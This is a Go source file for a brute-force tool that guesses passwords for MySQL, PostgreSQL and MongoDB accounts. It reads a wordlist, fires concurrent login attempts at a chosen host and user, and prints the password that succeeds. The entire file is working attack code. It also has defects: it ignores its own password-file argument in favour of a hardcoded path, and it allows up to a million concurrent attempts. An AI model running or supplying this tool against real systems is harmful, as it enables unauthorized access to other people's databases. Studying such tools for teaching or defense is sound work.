package main

import (
	"database/sql"
	"log"
	"time"

	// Underscore means only import for
	// the initialization effects.
	// Without it, Go will throw an
	// unused import error since the mysql+postgres
	// import only registers a database driver
	// and we use the generic sql.Open()
	"bufio"
	"fmt"
	"os"

	_ "github.com/go-sql-driver/mysql"
	_ "github.com/lib/pq"
	"gopkg.in/mgo.v2"
)

var (
	username      string
	dbName        string
	host          string
	dbType        string
	passwordFile  string
	loginFunc     func(string)
	doneChannel   chan bool
	activeThreads = 0
	maxThreads    = 1000000
)

func loginPostgres(password string) {
	// Create the database connection string
	// postgres://username:password@host/database
	connStr := "postgres://"
	connStr += username + ":" + password
	connStr += "@" + host + "/" + dbName

	// Open does not create database connection, it waits until
	// a query is performed
	db, err := sql.Open("postgres", connStr)
	if err != nil {
		log.Println("Error with connection string. ", err)
	}

	// Ping will cause database to connect and test credentials
	err = db.Ping()
	if err == nil { // No error = success
		exitWithSuccess(password)
	} else {
		// The error is likely just an access denied,
		// but we print out the error just in case it
		// is a connection issue that we need to fix
		log.Println("Error authenticating with Postgres. ", err)
	}
	doneChannel <- true
}

func loginMysql(password string) {
	connStr := username + ":" + password
	connStr += "@tcp(" + host + ")/" // + dbName
	connStr += "?charset=utf8"
	db, err := sql.Open("mysql", connStr)
	//fmt.Println(connStr)
	if err != nil {
		log.Println("Error with connection string. ", err)
	}

	// Ping will cause database to connect and test credentials
	err = db.Ping()
	if err == nil { // No error = success
		exitWithSuccess(password)
	} else {
		// The error is likely just an access denied,
		// but we print out the error just in case it
		// is a connection issue that we need to fix
		log.Println("Error authenticating with MySQL. ", err)
	}
	doneChannel <- true
}

func loginMongo(password string) {
	// Define Mongo connection info
	// mgo does not use the Go sql driver like the others
	mongoDBDialInfo := &mgo.DialInfo{
		Addrs:   []string{host},
		Timeout: 10 * time.Second,
		// Mongo does not require a database name
		// so it is omitted to improve auth chances
		//Database: dbName,
		Username: username,
		Password: password,
	}
	_, err := mgo.DialWithInfo(mongoDBDialInfo)
	if err == nil { // No error = success
		exitWithSuccess(password)
	} else {
		log.Println("Error connecting to Mongo. ", err)
	}
	doneChannel <- true
}

func exitWithSuccess(password string) {
	log.Println("Success!")
	log.Printf("\nUser:%s\n Password:%s\n", username, password)
	fmt.Println("Brute use ", time.Since(t1))
	os.Exit(0)
}

func bruteForce() {
	passwords, err := os.Open("../password_list.txt")
	if err != nil {
		log.Fatal("Error open password file:", err)
	}
	defer passwords.Close()

	scanner := bufio.NewScanner(passwords)
	for scanner.Scan() {
		password := scanner.Text()
		if activeThreads >= maxThreads {
			<-doneChannel
			activeThreads -= 1
		}
		go loginFunc(password)
		activeThreads++
	}

	for activeThreads > 0 {
		<-doneChannel
		//activeThreads -= 1  //貌似没有用
	}
}

func checkArgs() (string, string, string, string, string) {
	if len(os.Args) == 5 && (os.Args[1] == "mysql" || os.Args[1] == "mongo") {
		return os.Args[1], os.Args[2], os.Args[3], os.Args[4], "IGNORED"
	}
	if len(os.Args) != 6 {
		printUsage()
		os.Exit(0)
	}
	return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5]
}

func printUsage() {
	fmt.Println(os.Args[0] + "\n" + `Usage:` + os.Args[0] + ` (mysql|postgres|mongo) <pwFile>` +
		` <user> <host>[:port] <dbName
  Examples:
	` + os.Args[0] + ` postgres passwords.txt nanodano` +
		` localhost:5432 myDb  
	` + os.Args[0] + ` mongo passwords.txt nanodano localhost
	` + os.Args[0] + ` mysql passwords.txt nanodano localhost`)
}

var t1 time.Time

func main() {
	t1 = time.Now()
	dbType, passwordFile, username, host, dbName = checkArgs()

	switch dbType {
	case "mongo":
		loginFunc = loginMongo
	case "postgres":
		loginFunc = loginPostgres
	case "mysql":
		loginFunc = loginMysql
	default:
		fmt.Println("Unknown database type: " + dbType)
		fmt.Println("Expected: mongo, postgres, or mysql")
		os.Exit(1)
	}

	doneChannel = make(chan bool)
	bruteForce()
}
